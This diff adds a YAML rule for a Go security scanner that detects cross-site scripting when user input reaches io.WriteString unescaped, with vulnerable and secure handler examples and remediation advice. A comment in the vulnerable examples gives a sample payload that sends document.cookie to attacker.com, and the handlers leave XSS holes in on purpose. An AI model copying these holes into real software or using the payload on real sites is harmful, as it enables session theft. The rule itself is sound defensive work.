@@ -1,0 +1,277 @@
+# Rule Identity
+id: GO-XSS-003
+name: XSS via io.WriteString to http.ResponseWriter
+short_description: User input flows into io.WriteString writing directly to ResponseWriter without HTML escaping — io.WriteString is a raw byte writer that performs no HTML neutralization.
+
+# Classification
+severity: HIGH
+category: security
+language: go
+ruleset: golang/GO-XSS-003
+
+# Vulnerability Details
+cwe:
+  - id: CWE-79
+    name: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - id: CWE-116
+    name: "Improper Encoding or Escaping of Output"
+    url: https://cwe.mitre.org/data/definitions/116.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
+tags:
+  - go
+  - security
+  - xss
+  - responsewriter
+  - io
+  - reflected-xss
+  - CWE-79
+  - CWE-116
+  - OWASP-A03
+
+# Author
+author:
+  name: Shivasurya
+  url: https://x.com/sshivasurya
+
+# Content
+description: |
+  `io.WriteString(w, s)` writes the string `s` directly to the writer `w` as-is, performing
+  no transformation of any kind. When `w` is an `http.ResponseWriter` and `s` contains
+  user-supplied data, every HTML character in that data reaches the browser unescaped,
+  enabling Cross-Site Scripting attacks.
+
+  **io.WriteString vs other write methods**:
+  `io.WriteString` is a convenience function that writes a string to an `io.Writer` —
+  it is functionally equivalent to `w.Write([]byte(s))`. Neither applies any escaping.
+  This distinguishes it sharply from `html/template`, which applies context-aware escaping
+  based on where a value is being inserted (HTML body, attribute, URL, JS context).
+
+  Common patterns that introduce this vulnerability:
+
+  1. **Direct user input write**:
+     ```go
+     io.WriteString(w, r.FormValue("name"))
+     ```
+
+  2. **String concatenation before write**:
+     ```go
+     io.WriteString(w, "<b>Hello " + r.URL.Query().Get("user") + "</b>")
+     ```
+     The concatenation does not escape the user value; `io.WriteString` writes the result raw.
+
+  3. **Indirect write via helper function**:
+     ```go
+     func respond(w io.Writer, msg string) { io.WriteString(w, msg) }
+     // Called as: respond(w, r.FormValue("q"))
+     ```
+     The taint flows through the intermediate function. This is why inter-procedural
+     analysis is needed to catch this pattern.
+
+  4. **Writer passed through middleware**:
+     A `ResponseWriter` wrapped by middleware still implements `io.Writer`. If tainted
+     data is written to a buffered wrapper and the buffer is later flushed to the
+     original ResponseWriter, the XSS payload reaches the client.
+
+  **Why io.WriteString appears in Go web handlers**:
+  Go's `net/http` handler signature (`func(w http.ResponseWriter, r *http.Request)`)
+  naturally leads developers to write responses using low-level I/O primitives. The
+  `http.ResponseWriter` interface embeds `io.Writer`, making `io.WriteString`, `fmt.Fprintf`,
+  and `w.Write()` all interchangeable from a type perspective. Developers writing simple
+  handlers often reach for these rather than `html/template`, especially for small responses
+  like error messages, where they underestimate the risk.
+
+  **Error handler XSS — a common false sense of security**:
+  Error responses are a frequent location of XSS via `io.WriteString`:
+  ```go
+  http.Error(w, "Not found: "+r.URL.Path, 404)
+  ```
+  Even `http.Error` ultimately writes the message to the ResponseWriter. If `r.URL.Path`
+  contains HTML characters, they are written to the 404 page. Real-world scanners have
+  found this pattern in production Go services where developers assumed "it's just an error
+  page" absolved them of escaping requirements.
+
+  **Relationship between this rule and GO-XSS-002**:
+  GO-XSS-002 covers `fmt.Fprintf/Fprintln/Fprint`; this rule covers `io.WriteString`.
+  Both are raw writers with no HTML awareness. The remediation is identical: replace
+  with `html/template` or pre-escape with `html.EscapeString`.
+
+message: |
+  User input flows into io.WriteString writing to ResponseWriter without HTML escaping.
+  Use html/template.Execute() for HTML responses, or pre-escape values with html.EscapeString()
+  and set Content-Type: text/html; charset=utf-8 explicitly.
+
+security_implications:
+  - title: Reflected XSS via URL Parameters
+    description: |
+      The most common io.WriteString XSS pattern: an HTTP handler reads a URL query
+      parameter or form field and writes it back into the response (e.g., a "search
+      results" page that shows what the user searched for). Attackers craft URLs with
+      XSS payloads and distribute them via phishing emails, social media, or QR codes.
+      Any victim who clicks the link executes the attacker's JavaScript in their browser.
+  - title: Cookie and Session Token Theft
+    description: |
+      Injected JavaScript reads `document.cookie` and exfiltrates all cookies for the
+      domain to an attacker-controlled endpoint via `new Image().src` or `fetch()`. If
+      session cookies lack the `HttpOnly` flag, the attacker immediately hijacks the session
+      without needing the user's password.
+  - title: XSS in Error Pages
+    description: |
+      Error handlers that reflect the requested path or query string into 4xx/5xx responses
+      are a common source of "low-severity" XSS that is exploitable in practice. A 404
+      page that says "The path /you-searched-for-X was not found" and reflects X without
+      escaping is fully exploitable even if developers dismiss it as "just an error page."
+  - title: Account Takeover via Admin Panel XSS
+    description: |
+      If io.WriteString XSS in an admin panel can be triggered by a regular user (e.g.,
+      by setting their username to a malicious payload stored in the database), visiting
+      the admin panel with the user listed will execute the payload in the administrator's
+      browser session, enabling privilege escalation.
+
+vulnerable_example: |
+  // VULNERABLE: io.WriteString with user input directly
+  func greetHandler(w http.ResponseWriter, r *http.Request) {
+      name := r.URL.Query().Get("name")
+      // Attacker: ?name=<img src=x onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">
+      io.WriteString(w, "<html><body><h1>Hello, "+name+"!</h1></body></html>")
+  }
+
+  // VULNERABLE: tainted error message reflected via io.WriteString
+  func fileHandler(w http.ResponseWriter, r *http.Request) {
+      path := r.URL.Path
+      if _, err := os.Stat(path); err != nil {
+          w.WriteHeader(http.StatusNotFound)
+          // Attacker requests: /path/<script>alert(1)</script>
+          io.WriteString(w, "Resource not found: "+path)
+          return
+      }
+  }
+
+  // VULNERABLE: helper that wraps io.WriteString — taint flows through function boundary
+  func writeHTML(w io.Writer, content string) {
+      io.WriteString(w, content) // content not escaped here
+  }
+
+  func profileHandler(w http.ResponseWriter, r *http.Request) {
+      bio := r.FormValue("bio") // user-controlled
+      writeHTML(w, "<div class='bio'>"+bio+"</div>") // taint enters through bio
+  }
+
+secure_example: |
+  // SECURE: html/template with context-aware escaping (recommended)
+  var greetTmpl = template.Must(template.New("greet").Parse(
+      `<html><body><h1>Hello, {{.}}!</h1></body></html>`))
+
+  func greetHandler(w http.ResponseWriter, r *http.Request) {
+      name := r.URL.Query().Get("name")
+      w.Header().Set("Content-Type", "text/html; charset=utf-8")
+      w.Header().Set("X-Content-Type-Options", "nosniff")
+      greetTmpl.Execute(w, name) // html/template escapes name in HTML body context
+  }
+
+  // SECURE: html.EscapeString for simple inline writes
+  import "html"
+
+  func simpleWrite(w http.ResponseWriter, r *http.Request) {
+      name := r.URL.Query().Get("name")
+      w.Header().Set("Content-Type", "text/html; charset=utf-8")
+      io.WriteString(w, "<p>Hello, "+html.EscapeString(name)+"</p>")
+  }
+
+  // SECURE: proper error pages with escaped request path
+  func notFoundHandler(w http.ResponseWriter, r *http.Request) {
+      w.Header().Set("Content-Type", "text/html; charset=utf-8")
+      w.WriteHeader(http.StatusNotFound)
+      // html.EscapeString prevents XSS if path contains HTML characters
+      io.WriteString(w, "Page not found: "+html.EscapeString(r.URL.Path))
+  }
+
+  // SECURE: JSON response — set correct Content-Type and use json.Marshal
+  func apiHandler(w http.ResponseWriter, r *http.Request) {
+      query := r.URL.Query().Get("q")
+      w.Header().Set("Content-Type", "application/json")
+      // json.NewEncoder HTML-escapes <, >, & in string values by default
+      json.NewEncoder(w).Encode(map[string]string{"query": query})
+  }
+
+  // SECURE: Content Security Policy as additional defense layer
+  func withCSP(next http.Handler) http.Handler {
+      return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+          w.Header().Set("Content-Security-Policy",
+              "default-src 'self'; script-src 'self'; object-src 'none'")
+          next.ServeHTTP(w, r)
+      })
+  }
+
+recommendations:
+  - Replace io.WriteString(w, userInput) with html/template rendering for all HTML responses.
+  - If io.WriteString must be used, pre-escape all user values with html.EscapeString().
+  - Set Content-Type: text/html; charset=utf-8 explicitly — never rely on auto-detection.
+  - Add X-Content-Type-Options: nosniff to all responses to disable MIME sniffing.
+  - Apply Content-Security-Policy header as a defense-in-depth layer.
+  - Escape values in error pages and 4xx/5xx responses — they are equally exploitable.
+  - For JSON API handlers, use encoding/json rather than string formatting into io.WriteString.
+  - Pre-compile html/template at startup and reuse across requests for performance.
+
+detection_scope: |
+  Tracks taint from HTTP request sources (net/http.Request.FormValue, URL.Query,
+  gin.Context, echo.Context, fiber.Ctx) to io.WriteString calls where the first argument
+  is an http.ResponseWriter. Global inter-procedural scope tracks taint through helper
+  functions that accept io.Writer parameters.
+
+# Compliance
+compliance:
+  - standard: OWASP Top 10
+    requirement: "A03:2021 — Injection (XSS reclassified as injection subtype in 2021)"
+  - standard: CWE Top 25 (2024)
+    requirement: "CWE-79 — Cross-site Scripting (ranked #2 in CWE Top 25 2024)"
+  - standard: PCI DSS v4.0
+    requirement: |
+      Requirement 6.2.4 — Protect web-facing applications against injection attacks.
+      XSS is a required test category under penetration testing for in-scope applications.
+  - standard: NIST SP 800-53 Rev 5
+    requirement: "SI-10 — Information Input Validation; SI-15 — Information Output Filtering"
+  - standard: HIPAA Security Rule
+    requirement: "§164.312(a)(1) — XSS enabling unauthorized access to ePHI via session hijacking"
+
+# References
+references:
+  - title: "CWE-79: Cross-site Scripting — MITRE"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - title: "CWE-116: Improper Encoding or Escaping of Output — MITRE"
+    url: https://cwe.mitre.org/data/definitions/116.html
+  - title: "Go io.WriteString documentation"
+    url: https://pkg.go.dev/io#WriteString
+  - title: "Go html/template — context-aware auto-escaping"
+    url: https://pkg.go.dev/html/template
+  - title: "Go html package — EscapeString"
+    url: https://pkg.go.dev/html#EscapeString
+  - title: "OWASP XSS Prevention Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+  - title: "OWASP Content Security Policy Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
+  - title: "Go html/template security model (go.dev blog)"
+    url: https://pkg.go.dev/html/template
+  - title: "Content Security Policy Level 3 (W3C)"
+    url: https://www.w3.org/TR/CSP3/
+  - title: "CVE-2023-24538 — backtick template injection in Go html/template"
+    url: https://pkg.go.dev/vuln/GO-2023-1703
+  - title: "NIST SP 800-53 Rev 5 — SI-10 Information Input Validation"
+    url: https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final
+  - title: "RFC 7231 — HTTP/1.1 Semantics: Content-Type header"
+    url: https://www.rfc-editor.org/rfc/rfc7231#section-3.1.1.5
+
+# Similar Rules
+similar_rules:
+  - GO-XSS-001
+  - GO-XSS-002
+
+# Test Files
+tests:
+  positive: tests/positive/
+  negative: tests/negative/
